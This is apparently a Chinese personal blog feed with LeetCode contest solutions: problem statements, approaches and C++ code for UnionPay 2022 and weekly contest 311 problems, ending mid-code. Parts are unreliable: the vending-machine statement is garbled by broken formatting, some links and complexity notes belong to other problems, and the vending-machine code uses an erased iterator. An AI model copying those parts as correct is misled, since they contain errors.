<li><code>1 &lt;= storeLimit &lt;= 10^6</code></li>
<li><code>1 &lt;= power.length &lt;= 10^5</code></li>
<li><code>0 &lt;= power[i] &lt;= 10^5</code></li>
<li><code>1 &lt;= supply.length &lt;= power.length</code></li>
<li>对于 <code>i &lt; j</code>，满足 <code>supply[i][0] &lt; supply[j][0]</code></li>
<li><code>supply[i].length == 3</code></li>
<li><code>0 &lt;= supply[i][0] &lt; power.length</code></li>
<li><code>0 &lt;= supply[i][1]&lt;= supply[i][2] &lt;= 10^5</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/wMGN0t/">https://leetcode.cn/contest/cnunionpay2022/problems/wMGN0t/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于 <code>supply</code> 从 <code>0</code> 开始，因此我们直接模拟从最小的开始即可：<ul>
<li>如果 <code>power</code> 小于 <code>supply</code> 则减少储能即可；</li>
<li>如果 <code>power</code> 大于 <code>supply</code> 则增加储能即可；</li>
<li>最终返回最后的储能结果即可；</li>
</ul>
</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n + m)$，$m, n$ 为  <code>power, supply</code> 的长度。</li>
<li>空间复杂度：空间复杂度为 $O(m)$，$m$ 为数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">StoredEnergy</span><span class="params">(<span class="type">int</span> storeLimit, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; power, <span class="type">const</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; supply)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = power.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; arr = supply;</span><br><span class="line">        arr.<span class="built_in">emplace_back</span>(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(&#123;n, <span class="number">0</span>, <span class="number">0</span>&#125;));</span><br><span class="line">        <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>, i = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; arr[j][<span class="number">0</span>] &amp;&amp; i &lt; n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (power[i] &lt; arr[j<span class="number">-1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">                    total = <span class="built_in">max</span>(total - (arr[j<span class="number">-1</span>][<span class="number">1</span>] - power[i]), <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (power[i] &gt; arr[j<span class="number">-1</span>][<span class="number">2</span>]) &#123;</span><br><span class="line">                    total = <span class="built_in">min</span>(total + (power[i] - arr[j<span class="number">-1</span>][<span class="number">2</span>]), storeLimit);</span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="银联-4-设计自动售货机"><a href="#银联-4-设计自动售货机" class="headerlink" title="银联-4. 设计自动售货机"></a>银联-4. 设计自动售货机</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>「银联二维码」支付可以提供简便、顺畅的消费服务，通过出示二维码或扫描二维码即可完成支付。<br>现有一台使用<strong>银联二维码</strong>进行支付的自动售货机，并对使用 银联 支付的用户提供额外的优惠服务。</p>
<blockquote>
<p>同一名顾客每成功购买一次，下次购买便可多享受 1% 的折扣（折后价<strong>向上取整</strong>），最低折扣为 70%</p>
<ul>
<li>即：第一次购买支付 100% 费用，第二次购买支付 99% 费用， 第三次购买支付 98% 费用，以此类推。</li>
</ul>
</blockquote>
<p>请你设计一个自动售货机，你需要实现一个 <code>VendingMachine</code> 类：</p>
<ul>
<li><p><code>VendingMachine()</code> —— 初始化一个 <code>VendingMachine</code> 实例</p>
</li>
<li><p>&#96;&#96;&#96;<br>void addItem(int time, int number, string item, int price, int duration)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">—— 在</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>time</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">时刻向售货机中增加</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>number</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">个名称为</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>item</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">的商品，价格为</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>price</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">，保质期为</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>duration</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 同种商品可能有不同批次，不同批次的价格和保质期可能不同</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  long sell(int time, string customer, string item, int number)</span><br></pre></td></tr></table></figure>

<p>—— 在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time</span><br></pre></td></tr></table></figure>

<p>时刻，名称为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">customer</span><br></pre></td></tr></table></figure>

<p>的顾客前来购买了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">number</span><br></pre></td></tr></table></figure>

<p>个名称为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">item</span><br></pre></td></tr></table></figure>

<p>的商品，返回总费用</p>
<ul>
<li>当且仅当售货机中存在足够数量的未过期商品方可成功购买，并返回支付的总费用，否则一件商品也不会售出，并返回 <code>-1</code></li>
<li>对于价格不同的同种商品，优先售出价格<strong>最低</strong>的商品；</li>
<li>如果有价格相同的同种商品，优先出售<strong>距离过期时间最近</strong>的商品；</li>
</ul>
</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>输入保证前一次操作的 <code>time</code> 不大于后一次操作的 <code>time</code></li>
<li>过期指商品存入的时刻与保质期之和小于当前时刻，也即 <code>addtime + duration &lt; currTime</code></li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>[&quot;VendingMachine&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;sell&quot;]</code><br><code>[[],[0,3,&quot;Apple&quot;,10,10],[1,&quot;Tom&quot;,&quot;Apple&quot;,1],[2,&quot;Tom&quot;,&quot;Apple&quot;,3],[3,&quot;Mary&quot;,&quot;Banana&quot;,2],[11,&quot;Jim&quot;,&quot;Apple&quot;,1]]</code></p>
<p>输出: <code>[null,null,10,-1,-1,-1]</code></p>
<p>解释：<br><code>VendingMachine sys = new VendingMachine();</code><br><code>sys.addItem(0,3,&quot;Apple&quot;,10,10);</code> &#x2F;&#x2F; 时刻 <code>0</code> ，添加 <code>3</code> 个 <code>Apple</code>，价格为 <code>10</code>，保质期为 <code>10</code>。<br><code>sys.sell(1,&quot;Tom&quot;,&quot;Apple&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>1</code> ，用户 <code>Tom</code> 购买 <code>1</code> 个 <code>Apple</code>， 支付 <code>10</code> ：。<br><code>sys.sell(2,&quot;Tom&quot;,&quot;Apple&quot;,3);</code> &#x2F;&#x2F; 时刻 <code>2</code> ，售货机中 <code>Apple</code> 数量为 <code>2</code> ，用户 <code>Tom</code> 购买失败，返回 <code>-1</code>。<br><code>sys.sell(3,&quot;Mary&quot;,&quot;Banana&quot;,2);</code> &#x2F;&#x2F; 时刻 <code>3</code> ，售货机中没有 <code>Banana</code> ，用户 <code>Mary</code> 购买失败，返回 <code>-1</code>。<br><code>sys.sell(11,&quot;Jim&quot;,&quot;Apple&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>11</code> ，售货机中的 <code>Apple</code> 全部过期，用户 <code>Jim</code> 购买失败，返回 <code>-1</code>。</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>[&quot;VendingMachine&quot;,&quot;addItem&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;sell&quot;]</code><br><code>[[],[0,1,&quot;Apple&quot;,4,3],[1,3,&quot;Apple&quot;,4,2],[2,&quot;Mary&quot;,&quot;Apple&quot;,2],[2,1,&quot;Banana&quot;,2,5],[4,&quot;Jim&quot;,&quot;Banana&quot;,2],[4,&quot;Mary&quot;,&quot;Banana&quot;,1],[4,&quot;Mary&quot;,&quot;Apple&quot;,1],[6,200,&quot;Apple&quot;,2,5],[6,&quot;Jim&quot;,&quot;Apple&quot;,100],[7,&quot;Mary&quot;,&quot;Apple&quot;,100]]</code></p>
<p>输出: <code>[null,null,null,8,null,-1,2,-1,null,200,196]</code></p>
<p>解释：<br><code>VendingMachine sys = new VendingMachine();</code><br><code>sys.addItem(0,1,&quot;Apple&quot;,4,3);</code> &#x2F;&#x2F; 时刻 <code>0</code> ，添加 <code>1</code> 个 <code>Apple</code>，价格为 <code>4</code>，保质期为 <code>3</code>。<br><code>sys.addItem(1,3,&quot;Apple&quot;,4,2);</code> &#x2F;&#x2F; 时刻 <code>1</code> ，添加 <code>3</code> 个 <code>Apple</code>，价格为 <code>4</code>，保质期为 <code>2</code>。<br><code>sys.sell(2,&quot;Mary&quot;,&quot;Apple&quot;,2);</code> &#x2F;&#x2F; 时刻 <code>2</code> ，用户 <code>Mary</code> 购买 <code>2</code> 个 <code>Apple</code>，支付 <code>8</code>。<br><code>sys.addItem(2,1,&quot;Banana&quot;,2,5);</code> &#x2F;&#x2F; 时刻 <code>2</code> ，添加 <code>1</code> 个 <code>Banana</code>，价格为 <code>2</code>，保质期为 <code>5</code>。<br><code>sys.sell(4,&quot;Jim&quot;,&quot;Banana&quot;,2);</code> &#x2F;&#x2F; 时刻 <code>4</code> ，售货机中 <code>Banana</code> 数量为 <code>1</code> ，用户 <code>Jim</code> 购买失败，返回 <code>-1</code>。<br><code>sys.sell(4,&quot;Mary&quot;,&quot;Banana&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>4</code> ，用户 <code>Mary</code> 购买 <code>1</code> 个 <code>Banana</code>，享受 1% 的优惠，向上取整后为 <code>2</code><br><code>sys.sell(4,&quot;Mary&quot;,&quot;Apple&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>4</code> ，售货机中的 <code>Apple</code> 全部过期，用户 <code>Mary</code> 购买失败，返回 <code>-1</code>。<br><code>sys.addItem(6,200,&quot;Apple&quot;,2,5);</code> &#x2F;&#x2F; 时刻 <code>6</code> ，添加 <code>200</code> 个 <code>Apple</code>，价格为 <code>2</code>，保质期为 <code>5</code>。<br><code>sys.sell(6,&quot;Jim&quot;,&quot;Apple&quot;,100);</code> &#x2F;&#x2F; 时刻 <code>6</code> ，用户 <code>Jim</code> 购买 <code>100</code> 个 <code>Apple</code>。返回 200<br><code>sys.sell(7,&quot;Mary&quot;,&quot;Apple&quot;,100);</code> &#x2F;&#x2F; 时刻 <code>7</code> ，用户 <code>Mary</code> 购买 <code>100</code> 个 <code>Apple</code>，可享受 2% 的优惠。返回196</p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= item.length,customer.length &lt;= 10</code>，<code>item</code> 和 <code>customer</code> 中只包含英文字母</li>
<li><code>1 &lt;= duration,price,number &lt;= 10^6</code></li>
<li><code>0 &lt;= time &lt;= 10^6</code></li>
<li><code>addItem</code> 和 <code>sell</code> 的总调用次数不超过 <code>1000</code> 次</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/NyZD2B/">https://leetcode.cn/contest/cnunionpay2022/problems/NyZD2B/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>堆 + 直接模拟</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目本身不是很难，我们需要统计每个顾客的购买次数，并同时存储每个批次的商品。<ul>
<li>每次添加产品时，将产品的价格、过期时间、数量作为一个批次添加到商品的信息中，并按照价格、过期时间、数量进行排序即可；</li>
<li>每次购买商品时，首先将当前商品中的过期的批次全部剔除掉，然后统计剩余的产品数量是否满足顾客的购买要求，如果不能满足购买要求则直接返回；</li>
<li>如果满足购买要求，依次按照题目要求的顺序从存储的货物中挑选适合数量的产品，并将每个批次的数量按照题目依次进行剔除掉。</li>
<li>在此我们为了方便计算使用 <code>treeset</code> 保存相关数据。</li>
</ul>
</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$ 表示 <code>addItem</code> 的执行次数。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示 <code>addItem</code> 的执行次数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">VendingMachine</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">VendingMachine</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addItem</span><span class="params">(<span class="type">int</span> time, <span class="type">int</span> number, string item, <span class="type">int</span> price, <span class="type">int</span> duration)</span> </span>&#123;</span><br><span class="line">        cnt[item].<span class="built_in">emplace</span>(price, time + duration, number);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">sell</span><span class="params">(<span class="type">int</span> time, string customer, string item, <span class="type">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> total = <span class="number">0</span>;</span><br><span class="line">        vector&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [sPrice, sDuration, sNumber] : cnt[item]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sDuration &lt; time) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(sPrice, sDuration, sNumber);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                total += sNumber;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : arr) &#123;</span><br><span class="line">            cnt[item].<span class="built_in">erase</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (total &lt; number) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = cnt[item].<span class="built_in">begin</span>(); it != cnt[item].<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number &gt;= <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it)) &#123;</span><br><span class="line">                ans += (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(*it) * <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it);</span><br><span class="line">                number -= <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it);</span><br><span class="line">                cnt[item].<span class="built_in">erase</span>(it);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">auto</span> t = <span class="built_in">make_tuple</span>(<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(*it), <span class="built_in">get</span>&lt;<span class="number">1</span>&gt;(*it), <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it) - number);</span><br><span class="line">                ans += (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(*it) * number;</span><br><span class="line">                cnt[item].<span class="built_in">erase</span>(it);</span><br><span class="line">                number = <span class="number">0</span>;</span><br><span class="line">                cnt[item].<span class="built_in">emplace</span>(t);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> freq = buyCnt[customer];</span><br><span class="line">        buyCnt[customer]++;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ceil</span>((<span class="type">double</span>) ans * (<span class="number">100.0</span> - freq) / <span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;string, <span class="type">int</span>&gt; buyCnt;</span><br><span class="line">    unordered_map&lt;string, set&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; cnt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 311</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/35/</url>
    <content><![CDATA[<h2 id="leetcode-contest-311"><a href="#leetcode-contest-311" class="headerlink" title="leetcode contest 311"></a>leetcode contest 311</h2><p>四个都是非常简单的题目，已经严重放水的题目了。</p>
<h4 id="6180-最小偶倍数"><a href="#6180-最小偶倍数" class="headerlink" title="6180. 最小偶倍数"></a>6180. 最小偶倍数</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个正整数 <code>n</code> ，返回 <code>2</code> 和 <code>n</code> 的最小公倍数（正整数）。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 5</span><br><span class="line">输出：10</span><br><span class="line">解释：5 和 2 的最小公倍数是 10 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 6</span><br><span class="line">输出：6</span><br><span class="line">解释：6 和 2 的最小公倍数是 6 。注意数字会是它自身的倍数。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 150</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/count-days-spent-together/">https://leetcode.cn/problems/count-days-spent-together/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>数学计算
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>$n$ 为偶数则返回 $n$，否则则返回 $n * 2$。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">smallestEvenMultiple</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (n &amp; <span class="number">1</span>) ? (n * <span class="number">2</span>) : n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6181-最长的字母序连续子字符串的长度"><a href="#6181-最长的字母序连续子字符串的长度" class="headerlink" title="6181. 最长的字母序连续子字符串的长度"></a>6181. 最长的字母序连续子字符串的长度</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>字母序连续字符串 是由字母表中连续字母组成的字符串。换句话说，字符串 <code>&quot;abcdefghijklmnopqrstuvwxyz&quot;</code> 的任意子字符串都是 字母序连续字符串 。</p>
<p>例如，<code>&quot;abc&quot;</code> 是一个字母序连续字符串，而 <code>&quot;acb&quot;</code> 和 <code>&quot;za&quot;</code> 不是。<br>给你一个仅由小写英文字母组成的字符串 <code>s</code> ，返回其 最长 的 字母序连续子字符串 的长度。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abacaba&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：共有 4 个不同的字母序连续子字符串 &quot;a&quot;、&quot;b&quot;、&quot;c&quot; 和 &quot;ab&quot; 。</span><br><span class="line">&quot;ab&quot; 是最长的字母序连续子字符串。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcde&quot;</span><br><span class="line">输出：5</span><br><span class="line">解释：&quot;abcde&quot; 是最长的字母序连续子字符串。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s</code> 由小写英文字母组成</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/length-of-the-longest-alphabetical-continuous-substring/">https://leetcode.cn/problems/length-of-the-longest-alphabetical-continuous-substring/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接计算连续的字符串长度即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(\log n + \log m)$，$m,n$ 表示运动员和训练师的数量。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestContinuousSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> curr = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] - s[i - <span class="number">1</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                curr++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                curr = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6182-反转二叉树的奇数层"><a href="#6182-反转二叉树的奇数层" class="headerlink" title="6182. 反转二叉树的奇数层"></a>6182. 反转二叉树的奇数层</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一棵 完美 二叉树的根节点 <code>root</code> ，请你反转这棵树中每个 奇数 层的节点值。</p>
<p>例如，假设第 <code>3</code> 层的节点值是 <code>[2,1,3,4,7,11,29,18]</code> ，那么反转后它应该变成 <code>[18,29,11,7,4,3,1,2]</code> 。<br>反转后，返回树的根节点。</p>
<p>完美 二叉树需满足：二叉树的所有父节点都有两个子节点，且所有叶子节点都在同一层。</p>
<p>节点的 层数 等于该节点到根节点之间的边数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">输入：root = [2,3,5,8,13,21,34]</span><br><span class="line">输出：[2,5,3,8,13,21,34]</span><br><span class="line">解释：</span><br><span class="line">这棵树只有一个奇数层。</span><br><span class="line">在第 1 层的节点分别是 3、5 ，反转后为 5、3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [7,13,11]</span><br><span class="line">输出：[7,11,13]</span><br><span class="line">解释： </span><br><span class="line">在第 1 层的节点分别是 13、11 ，反转后为 11、13 。 </span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [0,1,2,0,0,0,0,1,1,1,1,2,2,2,2]</span><br><span class="line">输出：[0,2,1,0,0,0,0,2,2,2,2,1,1,1,1]</span><br><span class="line">解释：奇数层由非零值组成。</span><br><span class="line">在第 1 层的节点分别是 1、2 ，反转后为 2、1 。</span><br><span class="line">在第 3 层的节点分别是 1、1、1、1、2、2、2、2 ，反转后为 2、2、2、2、1、1、1、1 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li>树中的节点数目在范围 <code>[1, 214]</code> 内</li>
<li><code>0 &lt;= Node.val &lt;= 105</code></li>
<li><code>root</code> 是一棵 完美 二叉树</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/smallest-subarrays-with-maximum-bitwise-or/">https://leetcode.cn/problems/smallest-subarrays-with-maximum-bitwise-or/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们直接按照层次来遍历二叉树的每一层，并将奇数层的节点的值和节点本身进行保存，然后将奇数层的节点的值按照要求进行反转之后再填回到节点中即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示节点的数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">reverseOddLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode *&gt; qu;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(root);</span><br><span class="line">        <span class="type">int</span> level = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> sz = qu.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;TreeNode *&gt; arr;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                TreeNode *curr = qu.<span class="built_in">front</span>();</span><br><span class="line">                qu.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (curr-&gt;left &amp;&amp; curr-&gt;right) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (level % <span class="number">2</span>) &#123;</span><br><span class="line">                        nums.<span class="built_in">emplace_back</span>(curr-&gt;left-&gt;val);</span><br><span class="line">                        nums.<span class="built_in">emplace_back</span>(curr-&gt;right-&gt;val);</span><br><span 